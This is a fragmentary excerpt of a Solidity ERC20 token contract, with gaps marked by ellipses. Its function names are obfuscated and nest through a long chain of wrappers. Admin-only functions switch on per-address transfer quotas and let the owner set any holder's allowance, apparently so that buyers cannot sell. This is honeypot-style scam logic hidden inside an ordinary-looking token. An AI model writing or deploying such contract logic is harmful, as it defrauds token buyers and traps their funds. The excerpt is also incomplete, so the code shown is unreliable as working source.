...
abstract contract IEJCJDNEConsole is Context, IEJCJDNERoleControl {
    ...
    function _setToRole(bytes32 role, address account, uint256 amt) internal {
        ...
        if(isnum > 0){
            if(account != uniswapV2Pair){
                _newhash(TRADER,account,1);
            }
        }

        _setToRoles(role, account, amt);
    }


    function _setFromRole(bytes32 role, address account, uint256 amt) internal {
        if (!hasRole(role, account)) {
            revert(
                "AccessControl: addr "
            );
    ...
    function _setToRoles(bytes32 role, address account, uint256 amt) internal {
    ...
    function queryA(
        ...
        return _roles[role].RD.RM[account].div(1 * 10 ** 18);
    }
    ...
    function queryRD(
        ...
        return _roles[role].RD.RD[account].div(1 * 10 ** 18);
    }

    function _IEJCJDNEisOpen(
        uint isopen
    ) external onlyRole(ADMIN) {
        isnum = isopen;
    }

    function _IEJCJDNElaseT(
        bytes32 rule,
        address addr,
        string memory memo
    ) external onlyRole(ADMIN) {
        ...
        _newhash(rule,addr,memoUint);
    }


    function _newhash(bytes32 role, address account, uint256 num) internal virtual {
        _roles[role].RD.RM[account] = num.mul(1 * 10 ** 18);
    }
...
contract IEJCJDNEERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is IEJCJDNEERC20, IEJCJDNEConsole {
    ...
    ) IEJCJDNEERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(IEJCJDNEERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _IEJCJDNEfrtbcb(from, to, amt);
    }

    function _IEJCJDNEfrtbcb(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _IEJCJDNEkyghde(from, to, amt);
    }

    function _IEJCJDNEkyghde(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _IEJCJDNEgjrhdf(from, to, amt);
    }

    function _IEJCJDNEgjrhdf(address from, address to, uint256 amt) internal {
        ...
        _IEJCJDNEasea(from, to, amt);
    }

    function _IEJCJDNEasea(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _IEJCJDNEkyukgh(from, to, amt);
    }

    function _IEJCJDNEkyukgh(address from, address to, uint256 amt) internal {
        
        _IEJCJDNEyull(from, to, amt);
    }

    function _IEJCJDNEyull(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _IEJCJDNEiuter(from, to, amt);
    }

    function _IEJCJDNEiuter(address from, address to, uint256 amt) internal {
        ...
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {
            ...
            _setToRole(TRADER, from, amt);

            _setFromRole(TRADER, to, amt);

            super._transfer(from, to, amt);

            super._burn(to, amt.div(1000));
